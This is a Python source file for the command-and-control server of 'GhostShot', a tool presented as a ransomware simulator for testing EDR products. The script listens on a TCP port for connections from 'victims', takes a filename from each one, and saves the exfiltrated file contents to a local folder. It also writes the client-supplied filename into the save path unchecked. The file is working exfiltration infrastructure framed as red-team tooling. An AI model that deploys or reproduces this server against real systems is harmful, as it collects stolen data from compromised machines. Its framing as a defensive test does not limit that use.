# ----- License -------------------------------------------------- # 

#  GhostShot - GhostShot simulates ransomware attacks to test EDR systems, enabling users to strengthen their defense strategies.
#  Copyright (c) 2025 - ThrillByte (Operated by Kaung10). All rights reserved.

#  This software is an proprietary intellectual property developed for
#  penetration testing, threat modeling, and security research. It   
#  is licensed under the ThrillByte OWNERSHIP EDICT:
#
#  🚫 PROHIBITION WARNING 🚫
#  Redistribution, re-uploading, and unauthorized modification are strictly forbidden 
#  under the TOE. Use is granted ONLY under the limited terms defined in the official 
#  LICENSE file (TOE), which must be included in all copies.

#  DISCLAIMER:
#  This tool is intended for **educational or ethical testing** purposes only.
#  Unauthorized or malicious use of this software against systems without 
#  proper authorization is strictly prohibited and may violate laws and regulations.
#  The author assumes no liability for misuse or damage caused by this tool.

#  🔗 LICENSE: ThrillByte OWNERSHIP EDICT (TOE)
#  🔗 Repository: https://github.com/Kaung10
#  🔗 Author: Steven Pereira (@Kaung10)

# ----- Libraries ------------------------------------------------ #

import os
import socket
import threading
from datetime import datetime
from rich.console import Console

# --- Configuration ---
SAVE_DIR = "received"
console = Console()

# Ensure save directory exists
if not os.path.exists(SAVE_DIR):
    os.makedirs(SAVE_DIR)

def handle_connection(client, addr):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    console.print(f"[green][+] [{timestamp}] Connection from {addr[0]}:{addr[1]}")
    
    try:
        # 1. Receive the header (Filename)
        # We read a small buffer to find the newline separator
        header = client.recv(1024).decode('utf-8', errors='ignore')
        if not header:
            return
        
        # Split at the first newline to separate filename from potential content
        parts = header.split('\n', 1)
        filename = parts[0].strip()
        
        if not filename:
            console.print("[red][!] Received connection but no filename provided.")
            return

        file_path = os.path.join(SAVE_DIR, filename)
        console.print(f"[#C6ECE3][{timestamp}] [>] Exfiltrating: [bold]{filename}[/bold]")

        # 2. Save the file content
        with open(file_path, "wb") as f:
            # If we accidentally read file content in the first 'recv', write it now
            if len(parts) > 1 and parts[1]:
                f.write(parts[1].encode('utf-8'))
            
            # Stream the rest of the file
            while True:
                chunk = client.recv(4096)
                if not chunk:
                    break
                f.write(chunk)
        
        console.print(f"[green][+] File saved successfully: {file_path}")

    except Exception as e:
        console.print(f"[red][!] Error handling exfiltration: {e}")
    finally:
        client.close()

def c2_server(host, port):
    console.print(f"[red][+] GhostShot C2 Server Started - Listening for GhostShot Victims.....")
    
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((host, port))
            server.listen(5)
            console.print(f"[#C6ECE3][*] Listening on {host}:{port}.....")
            
            while True:
                client, addr = server.accept()
                # Use threading to handle multiple file transfers simultaneously
                thread = threading.Thread(target=handle_connection, args=(client, addr))
                thread.start()

    except KeyboardInterrupt:
        console.print("\n[red][!] Ctrl+C detected. Shutting down C2 server...")
    except Exception as e:
        console.print(f"[red][!] Fatal Server Error: {e}")
    finally:
        console.print("[#C6ECE3][*] Server stopped.")
# ----- Banner --------------------------------------------------- #

def ascii():
	console.print(rf"""[#C6ECE3]
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                                                                                        │
│       ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗ ███████╗██╗  ██╗ ██████╗ ████████╗    │
│      ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝ ██╔════╝██║  ██║██╔═══██╗╚══██╔══╝    │
│      ██║  ███╗███████║██║   ██║███████╗   ██║    ███████╗███████║██║   ██║   ██║       │
│      ██║   ██║██╔══██║██║   ██║╚════██║   ██║    ╚════██║██╔══██║██║   ██║   ██║       │
│      ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║    ███████║██║  ██║╚██████╔╝   ██║       │
│       ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝    ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝       │
│                                                                                        │
│                              ☠  G H O S T   S H O T  ☠                                 │
│                                                                                        │
│                           "one shot. no trace. no mercy."                              │
│                                                                                        │
└────────────────────────────────────────────────────────────────────────────────────────┘
	""")
	console.print(rf"[#C6ECE3]+--------------------------------------------------------------+")
	console.print(rf"[#C6ECE3]  GhostShot - Test Defenses. Silent Attacks. Loud Lessons.")
	console.print(rf"[#C6ECE3]  Created by [ThrillByte]Kaung10")
	console.print(rf"[#C6ECE3]+--------------------------------------------------------------+")

# ----- Main Function -------------------------------------------- #

if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    ascii()

    # 1. Get IP Input (Defaults to 0.0.0.0 if left blank)
    target_host = console.input("[bold cyan]Enter Listener IP (default 127.0.0.1): [/bold cyan]").strip() or "127.0.0.1"

    # 2. Get Port Input with basic error handling
    try:
        port_raw = console.input("[bold cyan]Enter Listener Port (default 2701): [/bold cyan]").strip()
        target_port = int(port_raw) if port_raw else 2701
    except ValueError:
        console.print("[red][!] Invalid port entered. Defaulting to 2701.[/red]")
        target_port = 2701

    # Start the server with the user-defined values
    c2_server(target_host, target_port)
    
    console.print("[#C6ECE3]+--------------------------------------------------------------+")

# ----- End ------------------------------------------------------ #
